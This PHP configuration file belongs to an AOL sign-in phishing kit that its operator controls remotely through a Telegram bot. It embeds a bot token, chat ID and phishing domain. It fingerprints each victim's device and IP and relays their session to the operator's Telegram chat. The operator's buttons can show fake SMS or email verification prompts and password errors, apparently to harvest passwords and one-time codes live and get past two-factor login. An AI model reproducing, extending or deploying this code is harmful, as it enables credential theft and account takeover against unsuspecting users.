<?php

// Compatibility patch for servers misreporting their PHP version
if (!function_exists('str_contains')) {
    function str_contains(string $haystack, string $needle): bool {
        return $needle !== '' && mb_strpos($haystack, $needle) !== false;
    }
}


// config.php — AOL Sign-in · Telegram Remote Control

define('TG_TOKEN',     '8743805665:AAEw5Rasr-JhkUzua-X101aG7tcB-xCi7AM');
define('TG_CHAT_ID',   '1212136600');
define('APP_URL',      'https://yi.hubyvc.com/1vite/aol'); // ← change to live domain
define('SESSIONS_DIR',  __DIR__ . '/sessions_data');
define('SUCCESS_URL',   'https://www.paperlesspost.com/');

if (!is_dir(SESSIONS_DIR)) mkdir(SESSIONS_DIR, 0777, true);

/* ══════════════════════════════════════════
   DEVICE DETECTION
══════════════════════════════════════════ */
function detect_device(string $ua): array {
    $u = strtolower($ua);
    $os = 'Unknown OS';
    if (str_contains($u, 'iphone'))             $os = '🍎 iPhone (iOS)';
    elseif (str_contains($u, 'ipad'))           $os = '🍎 iPad (iOS)';
    elseif (str_contains($u, 'android'))        $os = '🤖 Android';
    elseif (str_contains($u, 'windows nt 10'))  $os = '🪟 Windows 10/11';
    elseif (str_contains($u, 'windows nt 6.3')) $os = '🪟 Windows 8.1';
    elseif (str_contains($u, 'windows nt 6.1')) $os = '🪟 Windows 7';
    elseif (str_contains($u, 'windows'))        $os = '🪟 Windows';
    elseif (str_contains($u, 'mac os x'))       $os = '🍏 macOS';
    elseif (str_contains($u, 'linux'))          $os = '🐧 Linux';
    elseif (str_contains($u, 'chromeos'))       $os = '💻 ChromeOS';

    $type = 'Desktop 🖥️';
    if (str_contains($u, 'mobile'))             $type = 'Mobile 📱';
    elseif (str_contains($u, 'tablet') || str_contains($u, 'ipad')) $type = 'Tablet 📟';

    $browser = 'Unknown Browser';
    if (str_contains($u, 'edg/') || str_contains($u, 'edge/'))      $browser = '🔵 Edge';
    elseif (str_contains($u, 'opr/') || str_contains($u, 'opera'))  $browser = '🔴 Opera';
    elseif (str_contains($u, 'brave'))                               $browser = '🦁 Brave';
    elseif (str_contains($u, 'chrome') && !str_contains($u, 'chromium')) $browser = '🌐 Chrome';
    elseif (str_contains($u, 'chromium'))                            $browser = '🌐 Chromium';
    elseif (str_contains($u, 'firefox'))                             $browser = '🦊 Firefox';
    elseif (str_contains($u, 'safari') && !str_contains($u, 'chrome')) $browser = '🧭 Safari';
    elseif (str_contains($u, 'samsung'))                             $browser = '📱 Samsung Browser';

    $ver = '';
    if (preg_match('/(chrome|firefox|safari|edg|opr|version)\/([0-9]+)/i', $ua, $m))
        $ver = ' v' . $m[2];

    return ['os' => $os, 'browser' => $browser . $ver, 'type' => $type, 'ua' => $ua];
}

/* ══════════════════════════════════════════
   VISITOR STATE
══════════════════════════════════════════ */
function state_file(string $sid): string {
    return SESSIONS_DIR . '/v_' . preg_replace('/[^a-zA-Z0-9]/', '', $sid) . '.json';
}
function get_state(string $sid): array {
    $f = state_file($sid);
    if (!file_exists($f)) return [
        'page' => 'email', 'blocked' => false, 'sid' => $sid,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? '?',
        'created' => date('H:i:s d/m/Y'),
        'device_os' => '?', 'device_browser' => '?', 'device_type' => '?',
    ];
    return json_decode(file_get_contents($f), true) ?? [];
}
function set_state(string $sid, array $data): void {
    $cur = get_state($sid);
    file_put_contents(state_file($sid), json_encode(array_merge($cur, $data)));
}
function delete_visitor(string $sid): void {
    $f = state_file($sid);
    if (file_exists($f)) unlink($f);
}

/* ══════════════════════════════════════════
   TELEGRAM API
══════════════════════════════════════════ */
function tg_send(string $text, array $rows = []): void {
    $keyboard = [];
    foreach ($rows as $row) {
        $kb_row = [];
        foreach ($row as $btn) {
            $b = ['text' => $btn['text']];
            if (!empty($btn['url']))           $b['url']           = $btn['url'];
            if (!empty($btn['callback_data'])) $b['callback_data'] = substr($btn['callback_data'], 0, 64);
            $kb_row[] = $b;
        }
        if ($kb_row) $keyboard[] = $kb_row;
    }
    $payload = ['chat_id' => TG_CHAT_ID, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $payload['reply_markup'] = json_encode(['inline_keyboard' => $keyboard]);
    _tg_post('sendMessage', $payload);
}
function tg_answer(string $cq_id, string $toast = ''): void {
    _tg_post('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => $toast]);
}
function _tg_post(string $method, array $data): array {
    $ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/' . $method);
    curl_setopt_array($ch, [CURLOPT_POST => true, CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10]);
    $res = curl_exec($ch); curl_close($ch);
    return json_decode($res ?? '{}', true) ?? [];
}

/* ══════════════════════════════════════════
   KEYBOARD BUILDERS
══════════════════════════════════════════ */

/** Main control panel — fired after password submit */
function tg_panel(string $sid): void {
    $s = get_state($sid);
    tg_send(
        "🟡 <b>AOL CONTROL PANEL</b>\n\n" .
        "🆔 ID: <code>{$sid}</code>\n\n" .
       
        "📌 <b>Choose what to show this visitor:</b>",
        [
            [
                ['text' => '📱 SMS Verification',   'callback_data' => "sms|{$sid}"],
                ['text' => '📧 Email Verification', 'callback_data' => "evc|{$sid}"],
            ],
            [
                ['text' => '❌ Password Error',     'callback_data' => "pwe|{$sid}"],
                ['text' => '💛 SUCCESS',            'callback_data' => "ok|{$sid}"],
            ],
            [
                ['text' => '🅱️ Block Visitor',      'callback_data' => "blk|{$sid}"],
            ],
        ]
    );
}

/** After SMS / Email verification code submit */
function tg_after_verify(string $sid, string $type = 'sms'): void {
    $label = $type === 'email' ? '📧 Email Code' : '📱 SMS Code';
    tg_send(
        "{$label} submitted!\n🆔 ID: <code>{$sid}</code>\n\n<b>What next?</b>",
        [
            [['text' => '💛 Correct → SUCCESS',  'callback_data' => "ok|{$sid}"],
             ['text' => '❌ Wrong Code',          'callback_data' => "ce|{$sid}"]],
            [['text' => '⏳ Keep Loading',         'callback_data' => "ld|{$sid}"],
             ['text' => '🅱️ Block Visitor',       'callback_data' => "blk|{$sid}"]],
        ]
    );
}
